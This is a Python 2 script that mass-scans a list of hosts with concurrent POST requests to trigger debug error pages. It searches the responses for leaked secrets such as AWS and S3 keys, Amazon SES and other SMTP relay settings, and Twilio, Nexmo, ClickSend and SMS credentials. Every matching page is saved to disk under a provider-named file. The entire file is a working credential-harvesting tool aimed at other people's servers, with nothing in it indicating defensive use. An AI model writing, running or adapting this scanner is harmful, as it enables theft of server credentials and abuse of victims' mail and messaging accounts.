from twisted.internet import reactor, threads
from urlparse import urlparse
import httplib
import itertools
from sys import argv
import re

concurrent = 200
finished=itertools.count(1)
reactor.suggestThreadPoolSize(concurrent)

	
def getBody(ourl):
    
        url = urlparse('http://'+ourl)
        conn = httplib.HTTPConnection(url.netloc)
        params = '1=1'   
        conn.request("POST", url.path, params)
        res = conn.getresponse()
        bodinya = res.read()
        if re.search("smtp-mail.outlook.com", bodinya):
            print "K.DEBUG > ", ourl
            open('outlook_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("AWS_KEY", bodinya):
            print "K.DEBUG > ", ourl
            open('aws_key_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("S3_KEY", bodinya):
            print "K.DEBUG > ", ourl
            open('s3key_'+url.netloc+'.html',"w+").write(bodinya)
        #startaws    

        elif re.search("email-smtp.us-east-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp-fips.us-east-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.us-east-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp-fips.us-east-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.us-west-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp-fips.us-west-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ap-south-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ap-northeast-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ap-southeast-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ap-southeast-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ap-northeast-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.ca-central-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.sa-east-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.eu-west-2.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.us-gov-west-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.eu-central-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp.eu-west-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("email-smtp-fips.us-gov-west-1.amazonaws.com", bodinya):
            print "K.DEBUG > ", ourl
            open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
        #endaws
        elif re.search("mandrill", bodinya):
            print "K.DEBUG > ", ourl
            open(url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.mailgun", bodinya):
            print "K.DEBUG > ", ourl
            open('mailgun_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.sendgrid", bodinya):
            print "K.DEBUG > ", ourl
            open('sendgrid_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("smtp.zoho", bodinya):
            print "K.DEBUG > ", ourl
            open('zoho_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("sendinblue.com", bodinya):
            print "K.DEBUG > ", ourl
            open('sendinblue_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("CLICKSEND", bodinya):
            print "K.DEBUG > ", ourl
            open('clicksnd_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("TWILIO_", bodinya):
            print "K.DEBUG > ", ourl
            open('twilio_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("NEXMO_KEY", bodinya):
            print "K.DEBUG > ", ourl
            open('nexmo_'+url.netloc+'.html',"w+").write(bodinya)
        elif re.search("SMS_", bodinya):
            print "K.DEBUG > ", ourl
            open('sms_'+url.netloc+'.html',"w+").write(bodinya)
        else:
            print "NO.DEBUG > ", ourl

        return res  
    


def processError(error,url):
    print "error", url#, error
    processedOne()

def processedOne():
    if finished.next()==added:
        reactor.stop()

def addTask(url):
    req = threads.deferToThread(getBody, url)
   # req.addCallback(processResponse, url)
    req.addErrback(processError, url)   

added=0

lists = argv[1]
numthread = argv[2]
readsplit = open(lists).read().splitlines()

for url in readsplit:
    added+=int(numthread)
    addTask(url.strip())

try:
    reactor.run()
except KeyboardInterrupt:
    reactor.stop()
